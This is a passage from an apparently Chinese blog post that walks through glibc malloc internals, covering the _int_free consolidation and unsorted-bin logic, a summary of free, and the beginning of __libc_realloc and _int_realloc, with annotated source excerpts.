class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果需要释放的<code>chunk</code>不是<code>mmap</code>分配的，就对传入的<code>chunk</code>指针进行合法性验证。指针不能指向<code>top chunk</code>，物理相邻的下一个<code>chunk</code>是否超出了指定的范围，指针指向的<code>chunk</code>必须被标记为<code>use</code>，物理相邻的下一个<code>chunk</code>的<code>size</code>大小需要满足要求。如果验证合法，那么就进入下一步。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ()<span class="comment">/*忽略 if .. endif*/</span>)&#123;</span><br><span class="line">    <span class="comment">//处理size大小小于最大fast bin限制的chunk，将其插入到fast bin链表中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">//合法性验证</span></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果物理相邻的上一个<code>chunk</code>是空闲的，则将两个<code>chunk</code>合并，这里采用了<a href="#unlink">unlink</a>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ()<span class="comment">/*忽略 if .. endif*/</span>)&#123;</span><br><span class="line">    <span class="comment">//处理size大小小于最大fast bin限制的chunk，将其插入到fast bin链表中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">//合法性验证</span></span><br><span class="line">    <span class="comment">//合并物理相邻的上一个chunk</span></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">            unlink(av, nextchunk, bck, fwd);</span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">        not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">        been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<span class="comment">//指针完整性验证</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果当前的<code>chunk</code>与<code>top chunk</code>相邻，则与<code>top chunk</code>合并。</p><p>否则判断物理相邻的下一个<code>chunk</code>是否是空闲的，如果是空闲的则进行合并，使用<code>unlink</code>将物理相邻的下一个<code>chunk</code>取下。如果非空闲，则将物理相邻的下一个<code>chunk</code>的<code>prev_inuse</code>置<code>0</code>，表示当前的<code>chunk</code>已经空闲。在判断<code>unsorted bin</code>链表头部和尾部指针正确之后，即将<code>chunk</code>插入到<code>unsorted bin</code>链表中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ()<span class="comment">/*忽略 if .. endif*/</span>)&#123;</span><br><span class="line">    <span class="comment">//处理size大小小于最大fast bin限制的chunk，将其插入到fast bin链表中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">//合法性验证</span></span><br><span class="line">    <span class="comment">//合并物理相邻的上一个chunk</span></span><br><span class="line">    <span class="comment">//将chunk合并到unsorted bin中</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">        <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line">            <span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">                (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">                systrim(mp_.top_pad, av);</span><br><span class="line">            <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">            heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">            assert(heap-&gt;ar_ptr == av);</span><br><span class="line">            heap_trim(heap, mp_.top_pad);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">        assert (locked);</span><br><span class="line">        (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里判断如果前面释放的<code>chunk</code>的大小比较大，就将<code>fastbin</code>中的<code>chunk</code>进行合并并添加到<code>unsorted bin</code>链表中，如果进程所在的分配区是主分配区并且可以收缩内存的话，就调用<code>systrim</code>收缩内存，否则就获得非主分配区的<code>heap_info</code>指针，调用<code>heap_trim</code>收缩<code>heap</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ()<span class="comment">/*忽略 if .. endif*/</span>)&#123;</span><br><span class="line">    <span class="comment">//处理size大小小于最大fast bin限制的chunk，将其插入到fast bin链表中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="comment">//处理chunk大于fast bin chunk的大小，且chunk为非mmap的情况</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后如果<code>chunk</code>是<code>mmap</code>分配的则调用<code>munmap</code>释放该<code>chunk</code>。‘</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol><li>首先检查<code>free_hook</code>，如果已经设置，则跳转到<code>free_hook</code>处，否则进入第二步</li><li>如果<code>chunk</code>是通过<code>mmap</code>分配的，则调用<code>munmap</code>函数释放<code>chunk</code>，否则调用<code>_int_free</code>函数（这部分只分析<code>_int_free</code>函数，<a href="#munmap">munmap在这里</a><ol><li>对传入的指针和其指向的<code>chunk size</code>进行合法性验证，判断传入的<code>chunk</code>为<code>inuse</code></li><li>若<code>chunk size</code>的大小满足<code>fast bin</code>的大小范围，则在经过指针和<code>size</code>的合法性验证之后将<code>chunk</code>插入到<code>fast bin</code>链表中。若<code>chunk</code>不是由<code>mmap</code>分配的，则进入下一步，否则进入第<code>5</code>步</li><li>此时<code>chunk size</code>的大小超过<code>fast bin</code>的规定范围，将<code>chunk</code>与物理相邻的前一个<code>chunk</code>进行前向合并，与物理相邻的后一个<code>chunk</code>(包含 <code>top chunk</code>)进行后向合并。合并后的<code>chunk</code>插入到<code>unsorted bin</code>链表中。进入下一步</li><li>判断释放的<code>chunk size</code>的大小，超过阈值之后收缩内存。</li><li><code>chunk</code>是通过<code>mmap</code>分配的，调用<code>munmap</code>释放<code>chunk</code>。</li></ol></li></ol><h2 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h2><h2 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h2><p><code>realloc(void* p, size_t n)</code>，扩展已经分配的内存空间。如果<code>p</code>指向的<code>chunk</code>存在连续的空闲空间，则扩展<code>p</code>指向的<code>chunk</code>。否则分配一块新的<code>chunk</code>，并将<code>p</code>指向的<code>chunk</code>中的数据拷贝到新<code>chunk</code>中释放原有的<code>chunk</code>，返回新<code>chunk</code>指针。当<code>p</code>为空时，<code>realloc</code>等价于<code>malloc</code>。如果新的<code>size</code>小于原有的<code>size</code>则只会拷贝<code>size</code>大小的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_realloc (<span class="type">void</span> *oldmem, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         <span class="comment">/* padded request size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *newp;             <span class="comment">/* chunk to return */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* realloc of null is supposed to be same as malloc */</span></span><br><span class="line">  <span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br><span class="line">    <span class="comment">/* chunk corresponding to oldmem */</span></span><br><span class="line">    <span class="type">const</span> mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">    <span class="comment">/* its size */</span></span><br><span class="line">    <span class="type">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">        ar_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ar_ptr = arena_for_chunk (oldp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">             allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">             Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">             here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) oldp &gt; (<span class="type">uintptr_t</span>) -oldsize, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (misaligned_chunk (oldp), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;realloc(): invalid pointer&quot;</span>, oldmem,</span><br><span class="line">                         ar_ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_realloc)</span><br></pre></td></tr></table></figure><p>首先检查<code>realloc_hook</code>是否设置，否则跳转到<code>realloc_hook</code>处。若传入的指针为空，则相当于<code>malloc</code>，若新申请的<code>size</code>为<code>0</code>，且指针不为空，则相当于<code>free</code>(这里是设置了参数可以为<code>0</code>的条件)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//size与指针合法性验证</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *newmem;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> HAVE_MREMAP</span></span><br><span class="line">    newp = mremap_chunk (oldp, nb);</span><br><span class="line">    <span class="keyword">if</span> (newp)</span><br><span class="line">        <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* Note the extra SIZE_SZ overhead. */</span></span><br><span class="line">    <span class="keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)</span><br><span class="line">        <span class="keyword">return</span> oldmem;                         <span class="comment">/* do nothing */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Must alloc, copy, free. */</span></span><br><span class="line">    newmem = __libc_malloc (bytes);</span><br><span class="line">    <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;              <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span> (newmem, oldmem, oldsize - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    munmap_chunk (oldp);</span><br><span class="line">    <span class="keyword">return</span> newmem;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>接下来判断原有的<code>chunk</code>是否为<code>mmap</code>分配的，如果是则首先判断<code>size</code>的大小，如果新申请的<code>size</code>比原始的<code>size</code>大<code>SIZE_SZ</code>字节的话，就重新<code>malloc</code>一个新的<code>chunk</code>，并拷贝数据，调用<a href="#munmap">munmap</a>函数释放原始的<code>chunk</code></p><blockquote><p>这里可以看到即使是扩展<code>mmap</code>分配的<code>chunk</code>，也是通过<code>malloc,copy,free</code>这三个操作来实现的。即<code>mmap</code>分配的<code>chunk</code>经过扩展之后的<code>chunk</code>是通过<code>malloc</code>分配的。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//size和指针合法性验证</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (oldp))&#123;</span><br><span class="line">    <span class="comment">//处理chunk是mmap的情况</span></span><br><span class="line">&#125;</span><br><span class="line">(<span class="type">void</span>) mutex_lock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">        ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (newp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Try harder to allocate memory in other arenas.  */</span></span><br><span class="line">    LIBC_PROBE (memory_realloc_retry, <span class="number">2</span>, bytes, oldmem);</span><br><span class="line">    newp = __libc_malloc (bytes);</span><br><span class="line">    <span class="keyword">if</span> (newp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class="line">        _int_free (ar_ptr, oldp, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newp;</span><br></pre></td></tr></table></figure><p>程序调用了<code>_int_realloc</code>函数来执行扩展内存的操作。如果调用失败，则在尝试在其他的<code>arena</code>处分配内存（<code>LIBC_PROBE</code>没看懂，注释是这样写的）。</p><h3 id="int-realloc"><a href="#int-realloc" class="headerlink" title="int_realloc"></a>int_realloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>*</span><br><span class="line">_int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,</span><br><span class="line">     INTERNAL_SIZE_T nb)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (oldp-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (oldsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;realloc(): invalid old size&quot;</span>;</span><br><span class="line">        errout:</span><br><span class="line">        malloc_printerr (check_action, errstr, chunk2mem (oldp), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    check_inuse_chunk (av, oldp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All callers already filter out mmap&#x27;ed chunks.  */</span></span><br><span class="line">    assert (!chunk_is_mmapped (oldp));</span><br><span class="line"></span><br><span class="line">    next = chunk_at_offset (oldp, oldsize);</span><br><span class="line">    INTERNAL_SIZE_T nextsize = chunksize (next);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (next-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;realloc(): invalid next size&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序首先对传入的指针指向的<code>chunk</code>和其物理相邻的下一个<code>chunk</code>进行了合法性验证，包含<code>size</code>的大小应在一定的范围内，原始<code>chunk</code>不能为<code>mmap</code>分配等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>*</span><br><span class="line">_int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,</span><br><span class="line">     INTERNAL_SIZE_T nb)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义和安全性检查</span></span><br><span class="line">    <span class="comment">//逻辑就是首先获得一个大于等于原有chunk的chunk，之后在进行拆分</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (oldsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* already big enough; split below */</span></span><br><span class="line">      newp = oldp;</span><br><span class="line">      newsize = oldsize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">        <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">        newp = mem2chunk (newmem);</span><br><span class="line">        newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">             Avoid copy if newp is next chunk after oldp.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">        <span class="keyword">if</span> (newp == next)</span><br><span class="line">        &#123;</span><br><span class="line">            newsize += oldsize;</span><br><span class="line">            newp = oldp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        